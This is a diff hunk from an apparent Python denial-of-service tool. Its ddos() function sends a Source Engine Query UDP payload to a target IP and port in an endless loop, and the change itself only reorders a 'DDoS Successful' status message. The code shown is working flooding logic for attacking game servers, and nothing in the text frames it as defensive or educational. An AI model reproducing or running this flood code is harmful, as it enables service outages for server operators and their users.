@@ -15,7 +15,7 @@ def ddos():
         payload = b"\xFF\xFF\xFF\xFF\x54\x53\x6F\x75\x72\x63\x65\x20\x45\x6E\x67\x69\x6E\x65\x20\x51\x75\x65\x72\x79\x00"
         while True:
             sock.sendto(payload, (target_ip, target_ports))
-            print("[*] DDoS Successful for: ( IP:", target_ip, "Port:", "|", target_ports, ")")
+            print("[*] DDoS Successful for: ( IP:", target_ip, "|", "Port:", target_ports, ")")
     except KeyboardInterrupt:
         print("[!] DDoS Exit")
     except Exception as e:
